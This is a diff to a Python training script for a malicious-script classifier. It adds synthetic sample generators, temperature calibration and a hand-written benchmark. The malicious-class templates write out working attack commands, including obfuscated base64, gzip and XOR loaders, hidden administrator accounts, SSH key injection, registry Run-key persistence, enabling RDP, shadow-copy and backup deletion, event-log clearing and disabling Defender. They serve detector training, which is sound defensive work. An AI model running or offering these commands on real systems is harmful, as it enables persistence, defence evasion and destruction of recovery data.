@@ -120,6 +120,12 @@ def gen_obfuscated():
         lambda: mix([f"import base64; exec(base64.b64decode('{b64(inner)}'))"], "sh"),
         lambda: mix([f"$h = '{''.join('%02x' % ord(c) for c in inner)}'", "$b = for($i=0;$i -lt $h.Length;$i+=2){[convert]::ToByte($h.Substring($i,2),16)}", "IEX ([text.encoding]::ASCII.GetString($b))"], "ps"),
         lambda: mix([f"Execute(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108))", f"x = \"{b64(inner)}\""], "vbs"),
+        lambda: mix(["import base64, zlib", f"exec(zlib.decompress(base64.b64decode('{b64(inner * 3)}')))"], "sh"),
+        lambda: mix([f"exec(__import__('base64').b64decode('{b64(inner)}').decode())"], "sh"),
+        lambda: mix([f"$m = New-Object IO.MemoryStream(,[Convert]::FromBase64String('{b64(inner * 4)}'))", "IEX (New-Object IO.StreamReader((New-Object IO.Compression.GzipStream($m,[IO.Compression.CompressionMode]::Decompress)))).ReadToEnd()"], "ps"),
+        lambda: mix([f"$k = {rnd.randint(1, 250)}", f"$b = [Convert]::FromBase64String('{b64(inner * 2)}')", "$d = $b | ForEach-Object { $_ -bxor $k }", "IEX ([Text.Encoding]::UTF8.GetString($d))"], "ps"),
+        lambda: mix([f"var s = atob('{b64(inner)}'); new Function(s)();"], "js"),
+        lambda: mix([f"echo {b64(inner * 2)} | base64 --decode | gunzip | sh"], "sh"),
     ])()
 
 
@@ -151,6 +157,12 @@ def gen_persistence():
         lambda: mix([f"$a = New-ScheduledTaskAction -Execute '{p}'", "$t = New-ScheduledTaskTrigger -AtLogOn", f"Register-ScheduledTask -TaskName '{n}' -Action $a -Trigger $t -RunLevel Highest"], "ps"),
         lambda: mix([f"wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=\"{n}\", EventNameSpace=\"root\\cimv2\", QueryLanguage=\"WQL\""], "bat"),
         lambda: mix([f"sc create {n} binPath= \"{p}\" start= auto", f"sc start {n}"], "bat"),
+        lambda: mix([f"net user {n} {word(8).capitalize()}{rnd.randint(10, 99)}! /add", f"net localgroup administrators {n} /add"], "bat"),
+        lambda: mix([f"New-LocalUser -Name '{n}' -Password (ConvertTo-SecureString '{word(9)}1!' -AsPlainText -Force)", f"Add-LocalGroupMember -Group 'Administrators' -Member '{n}'"], "ps"),
+        lambda: mix(["mkdir -p ~/.ssh", f"echo 'ssh-rsa AAAA{word(40)} {n}@{word(5)}' >> ~/.ssh/authorized_keys", "chmod 600 ~/.ssh/authorized_keys"], "sh"),
+        lambda: mix([f"echo '/tmp/.{n} &' >> /etc/rc.local", "chmod +x /etc/rc.local"], "sh"),
+        lambda: mix([f"reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes"], "bat"),
+        lambda: mix([f"Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name {n} -Value 'powershell -w hidden -ep bypass -File {p}'"], "ps"),
     ])()
 
 
@@ -167,7 +179,16 @@ def gen_evasion():
         lambda: mix(["reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"], "bat"),
         lambda: mix(["Set-ExecutionPolicy Bypass -Scope Process -Force", "Disable-WindowsOptionalFeature -Online -FeatureName Windows-Defender"], "ps"),
         lambda: mix(["setenforce 0", "systemctl stop auditd", "service apparmor stop"], "sh"),
+        lambda: mix(["vssadmin delete shadows /all /quiet", "wmic shadowcopy delete", "bcdedit /set {default} bootstatuspolicy ignoreallfailures"], "bat"),
+        lambda: mix(["bcdedit /set {default} recoveryenabled no", "wbadmin delete catalog -quiet"], "bat"),
+        lambda: mix(["fsutil usn deletejournal /d C:", "wevtutil cl Security", "del /f /q %SystemRoot%\\Prefetch\\*.pf"], "bat"),
+        lambda: mix(["Get-WinEvent -ListLog * | ForEach-Object { wevtutil cl $_.LogName }", "Remove-Item (Get-PSReadlineOption).HistorySavePath"], "ps"),
+        lambda: mix(["Stop-Service -Name WinDefend -Force", "Set-Service -Name WinDefend -StartupType Disabled", "Set-MpPreference -MAPSReporting 0 -SubmitSamplesConsent 2"], "ps"),
     ])()
+
+
+TRUSTED = ["download.microsoft.com", "download.visualstudio.microsoft.com", "github.com", "www.python.org", "nodejs.org", "dl.google.com", "download.mozilla.org", "get.docker.com",
+           "releases.hashicorp.com", "download.documentfoundation.org", "www.7-zip.org", "aka.ms", "objects.githubusercontent.com", "repo.anaconda.com", "cdn.jsdelivr.net"]
 
 
 def gen_benign():
@@ -197,6 +218,19 @@ def gen_benign():
         lambda: mix([f"$logo = [Convert]::FromBase64String('{b64(d * 20)}')", f"[IO.File]::WriteAllBytes('logo.png', $logo)"], "ps"),
         lambda: mix([f"Set-Location C:\\Projects\\{d}", "git pull", "npm install", "npm run build"], "ps"),
         lambda: mix([f"schtasks /create /tn \"Backup {d}\" /tr \"C:\\Scripts\\backup.bat\" /sc daily /st 02:00"], "bat"),
+        lambda: mix([f"$u = 'https://{rnd.choice(TRUSTED)}/{word()}/{word()}-setup.exe'", f"$o = \"$env:TEMP\\{word()}-setup.exe\"", "Invoke-WebRequest -Uri $u -OutFile $o", f"Start-Process $o -ArgumentList '{rnd.choice(['/quiet', '/S', '/silent /norestart', '/VERYSILENT'])}' -Wait"], "ps"),
+        lambda: mix([f"(New-Object System.Net.WebClient).DownloadFile('https://{rnd.choice(TRUSTED)}/{word()}.msi', 'C:\\Installers\\{n}.msi')", f"msiexec /i C:\\Installers\\{n}.msi /qn /norestart"], "ps"),
+        lambda: mix([f"curl -fsSL https://{rnd.choice(TRUSTED)}/{word()}.tar.gz -o /tmp/{n}.tar.gz", f"tar -xzf /tmp/{n}.tar.gz -C /opt", f"echo installed {n}"], "sh"),
+        lambda: mix([f"wget https://{rnd.choice(TRUSTED)}/{word()}-linux-x64.tar.xz", f"sha256sum -c {n}.sha256", f"tar -xf {word()}-linux-x64.tar.xz -C /opt"], "sh"),
+        lambda: mix([f"winget install --id {rnd.choice(['Git.Git', 'Python.Python.3.12', 'Microsoft.VisualStudioCode', 'Mozilla.Firefox', '7zip.7zip'])} -e", f"choco install {word()} -y"], "bat"),
+        lambda: mix([f"Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name '{d}' -Value '\"C:\\Program Files\\{n.capitalize()}\\{d}.exe\" --minimized'"], "ps"),
+        lambda: mix([f"reg add HKCU\\Software\\{n} /v Setting /t REG_SZ /d {d} /f", f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {n} /t REG_SZ /d \"C:\\Program Files\\{n}\\{d}.exe\" /f"], "bat"),
+        lambda: mix([f"powershell.exe -NoProfile -WindowStyle Hidden -File \"C:\\Program Files\\{n.capitalize()}\\Agent\\{d}.ps1\"", "exit 0"], "bat"),
+        lambda: mix(["Import-Module ActiveDirectory", f"Get-ADUser -Filter * -SearchBase 'OU={d},DC=corp,DC=local' | Export-Csv {n}.csv"], "ps"),
+        lambda: mix([f"net user {n} /domain", "net group \"Domain Admins\" /domain"], "bat"),
+        lambda: mix([f"New-Item -ItemType Directory -Path C:\\{d}", f"icacls C:\\{d} /grant 'Users:(OI)(CI)R'"], "ps"),
+        lambda: mix([f"msiexec /i \"C:\\Installers\\{d}.msi\" /qn /norestart"], "bat"),
+        lambda: mix([f"ssh {n}@10.0.{rnd.randint(0, 9)}.{rnd.randint(2, 200)} 'sudo systemctl restart {d} && systemctl status {d} --no-pager'"], "sh"),
     ])()
 
 
@@ -343,11 +377,56 @@ def quantize(W: np.ndarray):
     return np.clip(np.round(W / s), -127, 127).astype(np.int8), s.astype(np.float32)
 
 
-def save(W1, b1, W2, b2, path: Path):
+def save(W1, b1, W2, b2, path: Path, temp: float = 1.0):
     q1, s1 = quantize(W1)
     q2, s2 = quantize(W2)
     path.parent.mkdir(parents=True, exist_ok=True)
-    np.savez_compressed(path, w1=q1, s1=s1, b1=b1, w2=q2, s2=s2, b2=b2, labels=np.array(LABELS))
+    np.savez_compressed(path, w1=q1, s1=s1, b1=b1, w2=q2, s2=s2, b2=b2, labels=np.array(LABELS), temp=np.float32(temp))
+
+
+def fit_temperature(model, val) -> float:
+    """Softening factor T that makes the model's confidence match how often it is right on data it never trained on
+    (minimises the log-loss of softmax(logits / T) on the validation set)."""
+    if len(val) < 30:
+        return 1.0
+    Z, y = [], []
+    for lab, t in val:
+        idx, v = featurize(t)
+        Z.append(model.logits(idx, v))
+        y.append(LABELS.index(lab))
+    Z, y = np.asarray(Z), np.asarray(y)
+    best, best_loss = 1.0, 1e9
+    for T in np.arange(1.0, 4.01, 0.1):                  # only ever SOFTEN: never make the model more confident than it was trained to be
+        zz = Z / T
+        zz = zz - zz.max(1, keepdims=True)
+        p = np.exp(zz)
+        p /= p.sum(1, keepdims=True)
+        loss = float(-np.log(p[np.arange(len(y)), y] + 1e-9).mean())
+        if loss < best_loss:
+            best, best_loss = float(T), loss
+    return round(best, 2)
+
+
+def benchmark(model) -> dict:
+    """Score the model on the 60 hand-written scripts in ai_benchmark.py (never used for training), with the same rule the app uses:
+    a script counts as flagged when the model says it is not benign with at least 85% confidence."""
+    import ai_benchmark
+
+    fa, miss, bad_rows = 0, 0, []
+    for lab, t in ai_benchmark.ALL:
+        r = model.predict(t)
+        flagged = r["label"] != "benign" and r["confidence"] >= 0.85
+        if lab == "benign" and flagged:
+            fa += 1
+            bad_rows.append(("FALSE ALARM", r["label"], round(r["confidence"], 2), t[:60].replace("\n", " ")))
+        elif lab == "malicious" and not flagged:
+            miss += 1
+            bad_rows.append(("MISSED", r["label"], round(r["confidence"], 2), t[:60].replace("\n", " ")))
+    nb, nm = len(ai_benchmark.BENIGN), len(ai_benchmark.MALICIOUS)
+    for row in bad_rows:
+        say("    " + " | ".join(str(x) for x in row))
+    return {"benchmark_benign": nb, "benchmark_malicious": nm, "benchmark_false_alarms": fa, "benchmark_missed": miss,
+            "benchmark_accuracy": round(100 * (nb + nm - fa - miss) / (nb + nm), 1)}
 
 
 def evaluate(model, samples, title):
@@ -392,9 +471,12 @@ def run_training(benign=None, malicious=None, per_class=900, epochs=25, out=None
     cut = int(len(real) * 0.8)
     real_train, real_test = real[:cut], real[cut:]
     samples += [("benign", t) for _, t in real_train]
+    # drop exact duplicates, so the same text can never sit in both the training and the test part
+    seen: set[str] = set()
+    samples = [x for x in samples if not (x[1] in seen or seen.add(x[1]))]
     rnd.shuffle(samples)
-    k = int(len(samples) * 0.9)
-    train_set, test_set = samples[:k], samples[k:]
+    k1, k2 = int(len(samples) * 0.8), int(len(samples) * 0.9)
+    train_set, val_set, test_set = samples[:k1], samples[k1:k2], samples[k2:]
 
     say(f"training on {len(train_set)} samples ({FEATURES} features, {HIDDEN} hidden units)")
     W1, b1, W2, b2 = train(train_set, epochs=epochs, seed=seed, throttle=throttle, gpu=gpu)
@@ -402,12 +484,15 @@ def run_training(benign=None, malicious=None, per_class=900, epochs=25, out=None
     # write to a temporary file first, check it loads, then move it into place
     tmp = out_path.with_name(out_path.stem + ".tmp.npz")
     save(W1, b1, W2, b2, tmp)
+    temp = fit_temperature(aimodel.Model(tmp), val_set)
+    save(W1, b1, W2, b2, tmp, temp)
+    say(f"calibration: temperature {temp} (higher = the model was over-confident on data it had not seen)")
     aimodel.check_file(tmp)
     os.replace(tmp, out_path)
     model = aimodel.Model(out_path)
     say(f"saved {out_path} ({out_path.stat().st_size / 1024:.0f} KB, int8 weights; float32 would be {(W1.size + W2.size) * 4 / 1024:.0f} KB)")
 
-    conf = evaluate(model, test_set, "held-out generated + real samples")
+    conf = evaluate(model, test_set, "held-out generated + real samples (same generators as training: an optimistic number)")
     correct = int(np.trace(conf))
     say("confusion (rows = truth, columns = guess): " + str(LABELS))
     say(str(conf))
@@ -420,8 +505,11 @@ def run_training(benign=None, malicious=None, per_class=900, epochs=25, out=None
         for p, r in bad[:8]:
             say(f"    {r['label']} {round(r['confidence'], 2)} {p}")
 
+    say("independent benchmark (hand-written scripts, never used for training):")
+    bench = benchmark(model)
+    say(f"  {bench['benchmark_accuracy']}% right ({bench['benchmark_false_alarms']} false alarms of {bench['benchmark_benign']} harmless, {bench['benchmark_missed']} missed of {bench['benchmark_malicious']} malicious)")
     digest = hashlib.sha256(out_path.read_bytes()).hexdigest()
-    report = {
+    report = {**bench, "temperature": temp, "note": "test_accuracy uses generated samples (optimistic); benchmark_* is the honest score",
         "trained_at": time.time(), "seed": seed, "epochs": epochs, "samples": len(train_set),
         "real_files": len(real), "test_accuracy": round(100 * correct / max(len(test_set), 1), 2),
         "false_alarms": false_alarms, "real_test_files": real_n, "sha256": digest, "size_kb": round(out_path.stat().st_size / 1024),
